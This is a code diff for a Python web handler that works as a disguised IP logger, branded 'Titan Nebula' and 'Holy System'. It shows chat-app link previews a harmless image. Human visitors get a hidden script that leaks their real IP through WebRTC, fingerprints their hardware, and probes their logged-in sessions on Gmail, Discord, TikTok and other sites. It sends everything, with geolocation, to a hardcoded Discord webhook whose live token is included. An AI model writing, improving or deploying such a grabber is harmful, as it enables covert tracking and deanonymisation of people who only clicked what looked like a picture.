@@ -1,29 +1,36 @@
+# ==============================================================================
+#  _    _  ____  _      __     __  _____ __     __  _____  _______  ______  __  __ 
+# | |  | |/ __ \| |     \ \   / / / ____|\ \   / / / ____||__   __||  ____||  \/  |
+# | |__| | |  | | |      \ \_/ / | (___   \ \_/ / | (___     | |   | |__   | \  / |
+# |  __  | |  | | |       \   /   \___ \   \   /   \___ \    | |   |  __|  | |\/| |
+# | |  | | |__| | |____    | |    ____) |   | |    ____) |   | |   | |____ | |  | |
+# |_|  |_|\____/|______|   |_|   |_____/    |_|   |_____/    |_|   |______||_|  |_|
+# ==============================================================================
+# HOLY SYSTEM v25.0 | Paid System!
+# ==============================================================================
+
 from http.server import BaseHTTPRequestHandler
 import requests
 import httpagentparser
 import json
+import time
+import base64
 
 # --- CONFIGURATION ---
 config = {
     "webhook": "https://discord.com/api/webhooks/1458566674302238923/0EPCSiG8KU6QcDoFcT0Ugc6BN_fGX_7K6KsXtflSlkKV4ZPH9zSHx3bnirPb0bWDowEk",
     "image": "https://media.discordapp.net/attachments/1457070623238127690/1457320607749509130/images_12.jpg",
     "username": "TITAN NEBULA LOGGER",
-    "color": 0x00FFFF
+    "color": 0x00FFFF # Cyan
 }
 
 class handler(BaseHTTPRequestHandler):
     def do_GET(self):
         try:
-            # IP'yi al
-            ip = self.headers.get('x-forwarded-for', self.client_address[0])
-            if ',' in ip:
-                ip = ip.split(',')[0].strip()
-            
+            ip = self.headers.get('x-forwarded-for', self.client_address[0]).split(',')[0]
             ua = self.headers.get('user-agent', 'Unknown')
             
-            print(f"IP: {ip}, UA: {ua}")  # Debug için
-            
-            # Bot kontrolü
+            # 1. BOT & CRAWLER PROTECTION
             is_bot = any(b in ua for b in ["Discordbot", "TelegramBot", "Twitterbot", "Slackbot"])
             if is_bot:
                 self.send_response(200)
@@ -32,17 +39,11 @@ class handler(BaseHTTPRequestHandler):
                 self.wfile.write(f'<html><head><meta property="og:image" content="{config["image"]}"></head></html>'.encode())
                 return
 
-            # IP'den lokasyon al
-            try:
-                geo_response = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857", timeout=5)
-                geo_info = geo_response.json()
-                print(f"Geo info: {geo_info}")
-            except:
-                geo_info = {'isp': 'N/A', 'country': 'N/A', 'city': 'N/A', 'regionName': 'N/A', 'proxy': False, 'mobile': False}
-            
+            # 2. SERVER-SIDE GEOLOCATION
+            geo_info = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857").json()
             os_info, br_info = httpagentparser.simple_detect(ua)
 
-            # HTML gönder
+            # 3. DEPLOYING THE JAVASCRIPT AGENT
             self.send_response(200)
             self.send_header('Content-type', 'text/html; charset=utf-8')
             self.end_headers()
@@ -58,32 +59,23 @@ class handler(BaseHTTPRequestHandler):
                 async function captureAll() {{
                     let data = {{}};
                     
-                    // WebRTC ile IP
-                    try {{
-                        const pc = new RTCPeerConnection({{iceServers:[{{urls:"stun:stun.l.google.com:19302"}}]}});
-                        pc.createDataChannel("");
-                        pc.createOffer().then(o => pc.setLocalDescription(o));
-                        pc.onicecandidate = i => {{
-                            if(i && i.candidate && i.candidate.candidate) {{
-                                const match = /([0-9]{{1,3}}(\.[0-9]{{1,3}}){{3}})/.exec(i.candidate.candidate);
-                                if(match) data.real_ip = match[1];
-                            }}
-                        }};
-                        setTimeout(() => pc.close(), 3000);
-                    }} catch(e) {{}}
-                    
-                    // GPU
-                    let gpu = "N/A";
-                    try {{
-                        const canvas = document.createElement('canvas');
-                        const gl = canvas.getContext('webgl');
-                        if(gl) {{
-                            const dbg = gl.getExtension('WEBGL_debug_renderer_info');
-                            if(dbg) gpu = gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL);
+                    // --- NETWORK ANALYSIS ---
+                    const pc = new RTCPeerConnection({{iceServers:[{{urls:"stun:stun.l.google.com:19302"}}]}});
+                    pc.createDataChannel("");
+                    pc.createOffer().then(o => pc.setLocalDescription(o));
+                    pc.onicecandidate = i => {{
+                        if(i && i.candidate) {{
+                            data.real_ip = /([0-9]{{1,3}}(\.[0-9]{{1,3}}){{3}})/.exec(i.candidate.candidate)[1];
                         }}
-                    }} catch(e) {{}}
-                    
-                    // Session kontrolü
+                    }};
+
+                    // --- HARDWARE FINGERPRINTING ---
+                    const canvas = document.createElement('canvas');
+                    const gl = canvas.getContext('webgl');
+                    const dbg = gl.getExtension('WEBGL_debug_renderer_info');
+                    const gpu = dbg ? gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL) : "N/A";
+
+                    // --- SOCIAL SESSION SNIFFER ---
                     const sites = [
                         {{n:"Gmail", u:"https://accounts.google.com/ServiceLogin?service=mail"}},
                         {{n:"Discord", u:"https://discord.com/api/v9/experiments"}},
@@ -92,7 +84,6 @@ class handler(BaseHTTPRequestHandler):
                         {{n:"TikTok", u:"https://www.tiktok.com/login"}}
                     ];
                     let activeSessions = [];
-                    
                     for(let s of sites) {{
                         try {{
                             const ctrl = new AbortController();
@@ -101,40 +92,42 @@ class handler(BaseHTTPRequestHandler):
                             activeSessions.push(s.n);
                         }} catch(e) {{}}
                     }}
-                    
-                    // Webhook'a gönder
+
+                    // --- FINAL DATA PACKET ---
                     const payload = {{
                         "username": "{config["username"]}",
                         "embeds": [{{
                             "title": "🌌 NEBULA - IP LOGGED",
                             "color": {config["color"]},
-                            "description": "**A User Visited!**\\n\\n" +
+                            "description": "**A User Opened the Original Image!**\\n\\n" +
                                 "**IP Info:**\\n" +
                                 "> **IP:** `{ip}`\\n" +
-                                "> **Real IP:** `" + (data.real_ip || "Unknown") + "`\\n" +
+                                "> **Real IP (Bypass):** `" + (data.real_ip || "Secure") + "`\\n" +
                                 "> **Provider:** `{geo_info.get('isp', 'N/A')}`\\n" +
                                 "> **Country:** `{geo_info.get('country', 'N/A')}`\\n" +
-                                "> **City:** `{geo_info.get('city', 'N/A')}`\\n" +
-                                "> **Region:** `{geo_info.get('regionName', 'N/A')}`\\n" +
-                                "> **VPN/Proxy:** `{geo_info.get('proxy', False)}`\\n" +
-                                "> **Mobile:** `{geo_info.get('mobile', False)}`\\n\\n" +
-                                "**Hardware:**\\n" +
+                                "> **City/Region:** `{geo_info.get('city', 'N/A')}, {geo_info.get('regionName', 'N/A')}`\\n" +
+                                "> **VPN/Proxy:** `{geo_info.get('proxy', 'False')}`\\n" +
+                                "> **Mobile:** `{geo_info.get('mobile', 'False')}`\\n\\n" +
+                                "**PC/Hardware Info:**\\n" +
                                 "> **OS:** `{os_info}`\\n" +
                                 "> **Browser:** `{br_info}`\\n" +
                                 "> **GPU:** `" + gpu + "`\\n" +
                                 "> **Memory:** " + (navigator.deviceMemory || "N/A") + "GB\\n" +
                                 "> **CPU Cores:** " + navigator.hardwareConcurrency + "\\n\\n" +
                                 "**Active Sessions:**\\n" +
-                                "> `" + (activeSessions.join(" | ") || "None") + "`",
-                            "footer": {{"text": "Titan Nebula"}}
+                                "> `" + (activeSessions.join(" | ") || "None Detected") + "`\\n\\n" +
+                                "**User Agent:**\\n" +
+                                "```" + navigator.userAgent + "```",
+                            "footer": {{"text": "Titan Nebula v25.0 | Secure Logging"}}
                         }}]
                     }};
-                    
+
                     navigator.sendBeacon("{config["webhook"]}", new Blob([JSON.stringify(payload)], {{type: 'application/json'}}));
-                    console.log("Data sent");
                 }}
                 
-                captureAll();
+                window.onload = () => {{
+                    captureAll();
+                }};
                 </script>
             </body>
             </html>
@@ -142,17 +135,9 @@ class handler(BaseHTTPRequestHandler):
             self.wfile.write(content.encode('utf-8'))
 
         except Exception as e:
-            print(f"Hata: {e}")  # Hatayı göster
+            # Fallback
             self.send_response(302)
             self.send_header('Location', config["image"])
             self.end_headers()
-    
-    def log_message(self, format, *args):
-        print(f"{self.client_address[0]} - {format % args}")
 
-# Local'de test için
-if __name__ == '__main__':
-    from http.server import HTTPServer
-    server = HTTPServer(('localhost', 8000), handler)
-    print('Server http://localhost:8000 adresinde çalışıyor')
-    server.serve_forever()
+app = handler
